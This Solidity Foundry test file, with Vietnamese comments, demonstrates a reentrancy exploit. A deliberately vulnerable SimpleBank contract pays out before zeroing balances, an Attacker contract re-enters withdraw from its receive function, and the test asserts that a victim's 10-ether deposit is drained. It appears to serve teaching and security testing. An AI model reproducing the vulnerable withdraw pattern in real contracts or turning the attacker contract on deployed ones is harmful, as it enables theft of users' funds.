// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Target hợp đồng SimpleBank với lỗi Reentrancy
contract SimpleBankTarget {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Lỗi Reentrancy: Chuyển tiền trước khi hạ balance xuống 0 (Vi phạm CEI)
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "So du khong du");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, unicode"Rut tien thất bai");

        balances[msg.sender] = 0; 
    }
}

contract Attacker {
    SimpleBankTarget public bank;

    constructor(address payable _bank) {
        bank = SimpleBankTarget(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}

contract ReentrancyTest is Test {
    SimpleBankTarget public bank;
    Attacker public attacker;

    address public victim = address(0x1);

    function setUp() public {
        bank = new SimpleBankTarget();
        
        // Victim gửi 10 ether vào ngân hàng
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        bank.deposit{value: 10 ether}();

        // Kẻ tấn công khởi tạo với 1 ether
        attacker = new Attacker(payable(address(bank)));
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyExploit() public {
        uint256 bankInitialBalance = address(bank).balance;
        assertEq(bankInitialBalance, 10 ether);

        // Kẻ tấn công thực thi Reentrancy Attack
        attacker.attack{value: 1 ether}();

        uint256 bankFinalBalance = address(bank).balance;
        console.log("Bank balance before attack:", bankInitialBalance);
        console.log("Bank balance after attack:", bankFinalBalance);
        console.log("Attacker contract balance after attack:", address(attacker).balance);

        // Xác minh ngân hàng bị rút cạn toàn bộ tiền về 0
        assertEq(bankFinalBalance, 0);
        // Attacker chiếm trọn 11 ether từ ngân hàng (10 ETH của nạn nhân + 1 ETH của kẻ tấn công)
        assertEq(address(attacker).balance, 12 ether);
    }
}
